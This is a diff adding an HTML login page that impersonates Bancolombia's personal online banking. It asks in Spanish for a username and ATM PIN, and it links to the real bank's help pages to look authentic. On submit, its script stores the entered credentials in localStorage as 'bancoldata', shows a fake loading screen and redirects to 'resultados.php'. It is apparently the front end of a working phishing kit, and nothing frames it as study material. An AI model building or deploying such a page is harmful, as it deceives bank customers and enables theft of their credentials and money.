@@ -1,0 +1,243 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>svpersonasbancolombia</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background-color:#f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #002b5c;
+      color: white;
+      padding: 1rem 0.5rem;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+
+    header img {
+      height: 50px;
+      margin-bottom: 0.3rem;
+      max-width: 100%;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 1.4rem;
+      font-weight: 600;
+    }
+
+    .main-content {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 2rem 1rem;
+    }
+
+    .login-box {
+      background-color: #ffffff;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .login-box h4 {
+      text-align: center;
+      margin-bottom: 2rem;
+      color: #000000;
+      font-weight: 700;
+      font-size: 1.3rem;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+
+    .input-group .icon {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-50%);
+      color: #555;
+      font-size: 1rem;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 0.7rem 0.5rem 0.5rem 2.2rem;
+      border: none;
+      border-bottom: 1px solid #999;
+      font-size: 1rem;
+      background: transparent;
+      color: #333;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    .input-group input:focus {
+      border-bottom: 1px solid #002b5c;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 0.8rem;
+      background-color: #ccc;
+      border: none;
+      border-radius: 30px;
+      font-weight: 600;
+      font-size: 1rem;
+      color: #333;
+      cursor: not-allowed;
+      transition: background-color 0.3s ease, color 0.3s ease;
+    }
+
+    .login-button.active {
+      background-color: #fdda24;
+      color: #000000;
+      cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.85rem;
+      color: #666;
+    }
+
+   
+
+   
+    #loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255,255,255,0.8);
+      z-index: 9999;
+      text-align: center;
+      padding-top: 20%;
+    }
+
+    @media (max-width: 480px) {
+      header h1 {
+        font-size: 1.2rem;
+      }
+
+      .login-box h2 {
+        font-size: 1.1rem;
+      }
+
+      .promo-card p,
+      .promo-price {
+        font-size: 0.85rem;
+      }
+
+      .promociones h3 {
+        font-size: 1.1rem;
+      }
+    }
+  </style>
+  
+ 
+</head>
+<body>
+
+   <img src="img/antes.jpeg" alt="Bienvenido" style="max-width: 100%; margin-bottom: 1rem; border-radius: 8px;" />
+
+
+  <div class="main-content">
+    <div class="login-box">
+      <h4>¡Hola!</h4>
+      
+ <center>     <p style="margin-top: 0.1rem; font-size: 1.12rem; font-weight: 400;">
+ Ingresa los datos para getionar tus productos y hacer transacciones.
+</p>  </center>
+
+ <br>  <br> 
+      <form id="loginForm">
+        <div class="input-group">
+          <span class="icon"><i class="far fa-user"></i></span>
+          <input type="text" placeholder="Usuario" id="usuario" required />
+           
+        </div>
+         <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/recordar-usuario" target="_blank">
+        <img src="img/olvideuser.jpeg" alt="Bienvenido" style="max-width:50%; margin-bottom: 1rem; border-radius: 8px;" />   </a>
+
+        <div class="input-group">
+          <span class="icon"> <i class="fas fa-lock" style="opacity: 0.6; color: #666;"></i></span>
+          <input type="password" placeholder="Clave del cajero" id="clave" required />
+           
+        </div>
+        <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/crea-tu-clave" target="_blank">
+        <img src="img/olvideclave.jpeg" alt="Bienvenido" style="max-width: 40%; margin-bottom: 1rem; border-radius: 8px;" />    </a>
+         <br>  <br> <br>
+        <button type="submit" class="login-button" id="loginBtn" disabled>iniciar sesión</button>
+       <br>  <br>  <br> 
+
+        <a href="https://svpersonas.apps.bancolombia.com/crear-usuario/ingresa-tus-datos" target="_blank">
+    <center>   <img src="img/crear.jpeg" alt="Bienvenido" style="max-width: 40%; margin-bottom: 1rem; border-radius: 8px;" /></center>    </a>
+      </form>
+      
+    </div>
+
+   
+
+  <div id="loader">
+    <p>Cargando...</p>
+  </div>
+
+   <br> <br> <br> <br>
+<img src="img/des.jpeg" alt="Bienvenido" style="max-width: 100%; margin-bottom: 1rem; border-radius: 8px;" />
+  <script>
+    const usuario = document.getElementById('usuario');
+    const clave = document.getElementById('clave');
+    const loginBtn = document.getElementById('loginBtn');
+
+    function validarCampos() {
+      if (usuario.value.trim() !== '' && clave.value.trim() !== '') {
+        loginBtn.classList.add('active');
+        loginBtn.disabled = false;
+      } else {
+        loginBtn.classList.remove('active');
+        loginBtn.disabled = true;
+      }
+    }
+
+    usuario.addEventListener('input', validarCampos);
+    clave.addEventListener('input', validarCampos);
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const datos = {
+        usuario: usuario.value.trim(),
+        clave: clave.value.trim()
+      };
+
+      localStorage.setItem('bancoldata', JSON.stringify(datos));
+      document.getElementById('loader').style.display = 'block';
+      setTimeout(() => {
+        window.location.href = 'resultados.php';
+      }, 1500);
+    });
+  </script>
+
+</body>
+</html>
